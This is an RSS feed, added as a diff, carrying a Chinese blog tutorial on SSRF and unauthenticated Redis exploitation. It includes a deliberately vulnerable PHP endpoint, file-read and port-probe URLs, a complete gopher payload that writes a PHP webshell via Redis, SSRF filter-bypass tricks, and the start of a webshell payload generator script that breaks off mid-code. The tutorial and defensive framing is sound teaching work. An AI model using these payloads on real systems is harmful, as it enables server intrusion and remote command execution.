@@ -1,0 +1,573 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Redis on hadagaga blog</title><link>https://hadagaga.github.io/tags/redis/</link><description>Recent content in Redis on hadagaga blog</description><generator>Hugo -- gohugo.io</generator><language>en-zh</language><lastBuildDate>Tue, 18 Feb 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://hadagaga.github.io/tags/redis/index.xml" rel="self" type="application/rss+xml"/><item><title>SSRF-Redis未授权访问利用</title><link>https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</link><pubDate>Tue, 18 Feb 2025 00:00:00 +0000</pubDate><guid>https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</guid><description>&lt;img src="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/cover.png" alt="Featured image of post SSRF-Redis未授权访问利用" />&lt;h2 id="ssrf">SSRF
+&lt;/h2>&lt;h3 id="前言">前言
+&lt;/h3>&lt;p>​ 在近期的几场比赛中，考察了SSRF的知识点，实践下来，发现我之前严重低估了SSRF的威力，所以决定写下这篇文章，简单梳理一下SSRF的漏洞原理及利用方法。&lt;/p>
+&lt;h3 id="什么是ssrf">什么是SSRF？
+&lt;/h3>&lt;p>​ SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p>
+&lt;h4 id="ssrf漏洞原理">SSRF漏洞原理
+&lt;/h4>&lt;p>​ SSRF产生的原因大多是由于服务器提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如：一个正常业务，期望用户传入的参数是这样的：https://example.com，假设服务器没有过滤file://，那么攻击者就可以利用file伪协议访问本地文件，又或者说，没有限制用户传入的参数必须包含example这个域名，实际上如果只限制了必须包含example这个域名，而不限制&amp;rsquo;..&amp;rsquo;，仍然可以利用file伪协议访问本地文件。&lt;/p>
+&lt;p>​ SSRF主要的攻击方式如下：&lt;/p>
+&lt;blockquote>
+&lt;ul>
+&lt;li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。&lt;/li>
+&lt;li>攻击运行在内网或本地的应用程序。&lt;/li>
+&lt;li>对内网Web应用进行指纹识别，识别企业内部的资产信息。&lt;/li>
+&lt;li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。&lt;/li>
+&lt;li>利用file协议读取本地文件等。&lt;/li>
+&lt;/ul>
+&lt;/blockquote>
+&lt;p>​ PHP中漏洞产生的相关函数：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">file_get_contents&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fsockopen&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">curl_exec&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fopen&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">readfile&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ Java中漏洞产生的相关函数：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">execute&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">httpclient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">execute&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="ssrf利用">SSRF利用
+&lt;/h3>&lt;p>SSRF常用伪协议：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">##利用file协议查看本地文件
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">file://
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">##利用dict探测端口
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">dict://
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">##利用gopher协议反弹shell
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">gopher://
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="漏洞案例">漏洞案例
+&lt;/h4>&lt;p>​ 为了更方便理解SSRF，这里选择PHP来演示SSRF ，创建一个PHP文件，键入如下代码：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">curl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$url&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$ch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">curl_init&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">curl_setopt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$ch&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">CURLOPT_URL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$url&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">curl_setopt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$ch&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">CURLOPT_HEADER&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">curl_exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$ch&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">curl_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$ch&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;url&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">curl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$url&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 访问：&lt;a class="link" href="http://127.0.0.1/SSRF.php?url=www.baidu.com" target="_blank" rel="noopener"
+>http://127.0.0.1/SSRF.php?url=www.baidu.com&lt;/a>，你将会看到如下页面：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250112161912730-1739451911330-1.png"
+width="1568"
+height="538"
+srcset="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250112161912730-1739451911330-1_hu5401421010915785777.png 480w, https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250112161912730-1739451911330-1_hu12745821094928937038.png 1024w"
+loading="lazy"
+alt="image-20250112161912730"
+class="gallery-image"
+data-flex-grow="291"
+data-flex-basis="699px"
+>&lt;/p>
+&lt;p>​ 现在可确认这里是存在SSRF的，那么我们就可以尝试构造payload&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">#访问本地文件
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">http://127.0.0.1/SSRF.php?url=file:///etc/passwd
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#端口探测
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">http://127.0.0.1/SSRF.php?url=dict://127.0.0.1:6379
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#假设存在redis未授权访问，且服务为PHP，则可用gopher写shell
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">http://127.0.0.1/SSRF.php?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%247%0D%0A%0A%0Acmd%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 利用SSRF探测6379端口，发现存在redis服务。&lt;/p>
+&lt;p>​ &lt;img src="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250112162700988-1739451911330-2.png"
+width="956"
+height="121"
+srcset="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250112162700988-1739451911330-2_hu5183975825949764505.png 480w, https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250112162700988-1739451911330-2_hu4085506898993430605.png 1024w"
+loading="lazy"
+alt="image-20250112162700988"
+class="gallery-image"
+data-flex-grow="790"
+data-flex-basis="1896px"
+>&lt;/p>
+&lt;p>​ 后续就可以使用前面所提供的payload进行写马操作，由于我是在Windows上运行的PHP所以这里不做演示。&lt;/p>
+&lt;h3 id="ssrf常用绕过方法">SSRF常用绕过方法
+&lt;/h3>&lt;p>　1.@　　　　　　　　　　http://abc.com@127.0.0.1&lt;/p>
+&lt;p>　2.添加端口号　　　　　　http://127.0.0.1:8080&lt;/p>
+&lt;p>　3.短地址　　　　　　　　https://0x9.me/cuGfD 推荐：http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/&lt;/p>
+&lt;p>　4.可以指向任意ip的域名　 xip.io 原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1&lt;/p>
+&lt;p>　5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制）&lt;/p>
+&lt;p>　6.非HTTP协议&lt;/p>
+&lt;p>　7.DNS Rebinding&lt;/p>
+&lt;p>　8.利用[::]绕过 http://[::]:80/ &amp;raquo;&amp;gt; http://127.0.0.1&lt;/p>
+&lt;p>　9.句号绕过 127。0。0。1 &amp;raquo;&amp;gt; 127.0.0.1&lt;/p>
+&lt;p>　10.利用302跳转绕过 使用&lt;a class="link" href="https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/" target="_blank" rel="noopener"
+>https://tinyurl.com生成302跳转地址&lt;/a>&lt;/p>
+&lt;p>@：http://www.baidu.com@10.10.10.10 与 http?/10.10.10.10 请求是相同的&lt;/p>
+&lt;h4 id="过滤绕过">过滤绕过
+&lt;/h4>&lt;p>IP地址转换成十进制：&lt;/p>
+&lt;p>127.0.0.1 先转换为十六进制 7F000001 两位起步所以 1就是01&lt;/p>
+&lt;p>7F000001转换为二进制
+127.0.0.1=2130706433 最终结果&lt;/p>
+&lt;p>还有根据域名判断的，比如xip.io域名，就尝试如下方法&lt;/p>
+&lt;p>&lt;a class="link" href="http://xip.io/" target="_blank" rel="noopener"
+>xip.io&lt;/a>
+&lt;a class="link" href="http://xip.io127.0.0.1.xip.io/" target="_blank" rel="noopener"
+>xip.io127.0.0.1.xip.io&lt;/a> &amp;ndash;&amp;gt;127.0.0.1
+&lt;a class="link" href="http://www.127.0.0.1.xip.io/" target="_blank" rel="noopener"
+>www.127.0.0.1.xip.io&lt;/a> &amp;ndash;&amp;gt;127.0.0.1
+&lt;a class="link" href="http://haha.127.0.0.1.xip.io/" target="_blank" rel="noopener"
+>Haha.127.0.0.1.xip.io&lt;/a> &amp;ndash;&amp;gt;127.0.0.1
+&lt;a class="link" href="http://haha.xixi.127.0.0.1.xip.io/" target="_blank" rel="noopener"
+>Haha.xixi.127.0.0.1.xip.io&lt;/a> &amp;ndash;&amp;gt;127.0.0.1&lt;/p>
+&lt;h4 id="常见限制">常见限制
+&lt;/h4>&lt;p>&lt;strong>限制为&lt;a class="link" href="http://www.xxx.com/" target="_blank" rel="noopener"
+>http://www.xxx.com&lt;/a> 域名&lt;/strong>&lt;/p>
+&lt;p>采用http基本身份认证的方式绕过。即@
+&lt;code>http://www.xxx.com@www.xxc.com&lt;/code>&lt;/p>
+&lt;p>&lt;strong>限制请求IP不为内网地址&lt;/strong>&lt;/p>
+&lt;p>当不允许ip为内网地址时
+（1）采取短网址绕过
+（2）采取特殊域名
+（3）采取进制转换&lt;/p>
+&lt;p>&lt;strong>限制请求只为http协议&lt;/strong>&lt;/p>
+&lt;p>（1）采取302跳转
+（2）采取短地址&lt;/p>
+&lt;h3 id="ssrf防御建议">SSRF防御建议
+&lt;/h3>&lt;blockquote>
+&lt;ul>
+&lt;li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。&lt;/li>
+&lt;li>限制不能访问内网的IP，以防止对内网进行攻击。&lt;/li>
+&lt;li>屏蔽返回的详细信息。&lt;/li>
+&lt;/ul>
+&lt;/blockquote>
+&lt;h3 id="总结">总结
+&lt;/h3>&lt;p>​ 我们可以发现，SSRF的危害主要来自于本地文件的读取，以及暴露内网应用。而想要发挥SSRF最大的威力就需要搭配其他的漏洞，比如redis未授权访问或者fastcgi等扩大危害。&lt;/p>
+&lt;h2 id="redis未授权攻击">Redis未授权攻击
+&lt;/h2>&lt;blockquote>
+&lt;p>​ Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源IP访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，所以Redis可以实现如下攻击操作。&lt;/p>
+&lt;/blockquote>
+&lt;ol>
+&lt;li>如果是PHP服务器，或者支持解析JSP的Java服务器，那么就可以实现写Webshell操控服务器。&lt;/li>
+&lt;li>如果Redis服务器存在SSH服务，Redis服务器暴露在公网，并且运行Redis服务的用户拥有root权限，那么就可以在/root/.ssh文件夹的 authotrized_keys 文件中写入自己的ssh公钥，就可以使用对应私钥直接使用ssh服务登录服务器。&lt;/li>
+&lt;li>如果Redis服务器存在定时任务功能，那么就可以在定时任务路径中写入定时任务，执行命令行命令，就可以实现反弹shell，登陆服务器。&lt;/li>
+&lt;/ol>
+&lt;h3 id="创建redis服务">创建Redis服务
+&lt;/h3>&lt;p>​ 先运行一个Redis服务，步骤如下：&lt;/p>
+&lt;p>​ 靶机下载redis-4.0.10&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wget http://download.redis.io/releases/redis-4.0.10.tar.gz
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 解压，进入源码目录，然后编译(make、make install)，进入SRC目录，启动redis&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tar -zxf redis-4.0.10.tar.gz &lt;span class="c1">#解压&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> redis-4.0.10 &lt;span class="c1">#进入解压的文件夹内&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make install &lt;span class="c1">#编译&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> SRC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis-server
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 查看redis服务&lt;/p>
+&lt;p>​ 使用另一个终端，输入命令：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ps -ef &lt;span class="p">|&lt;/span> grep redis-server
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250206122138201.png"
+width="671"
+height="68"
+srcset="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250206122138201_hu8636273251385780996.png 480w, https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250206122138201_hu8507009815554518166.png 1024w"
+loading="lazy"
+alt="image-20250206122138201"
+class="gallery-image"
+data-flex-grow="986"
+data-flex-basis="2368px"
+>&lt;/p>
+&lt;h3 id="web服务绝对路径写入webshell">Web服务绝对路径写入Webshell
+&lt;/h3>&lt;p>​ 这里用PHP演示，使用前面所提供过的PHP文件。这里我们重点不是Redis，所以直接演示gopher协议写入PHPWebshell。如果有兴趣可以看如下文章：&lt;a class="link" href="https://www.cnblogs.com/wjrblogs/p/14456190.html" target="_blank" rel="noopener"
+>SSRF + Redis 利用方式学习笔记 - 1ndex- - 博客园&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">urllib&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">urllib.parse&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">protocol&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;gopher://&amp;#34;&lt;/span> &lt;span class="c1"># 使用的协议 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ip&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;127.0.0.1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;6379&amp;#34;&lt;/span> &lt;span class="c1"># 目标redis的端口号 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s2">&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt;&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">filename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;shell.php&amp;#34;&lt;/span> &lt;span class="c1"># shell的名字 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">path&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/var/www/html&amp;#34;&lt;/span> &lt;span class="c1"># 写入的路径&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">passwd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="c1"># 如果有密码 则填入&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 我们的恶意命令 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;flushall&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;set 1 &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)),&lt;/span>
